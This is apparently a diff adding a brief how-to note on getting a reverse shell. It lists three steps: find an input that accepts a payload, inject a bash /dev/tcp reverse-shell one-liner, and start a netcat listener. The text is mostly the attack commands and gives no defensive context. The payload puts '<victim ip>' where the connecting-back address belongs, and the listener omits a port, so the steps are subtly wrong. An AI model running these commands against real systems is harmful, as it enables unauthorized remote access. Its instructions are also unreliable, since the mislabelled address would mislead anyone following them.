@@ -1,0 +1,10 @@
+Basic way to hit a reverse shell connection.
+
+1. Find vulnerable input site.
+    This can be anything from a search bar to a listening port, anything that will recieve our payload.
+
+2. Input payload into vulnerable site.
+    bash -i >& /dev/tcp/<victim ip>/<port> 0>&1
+
+3. Setup listener.
+    nc -lvnp
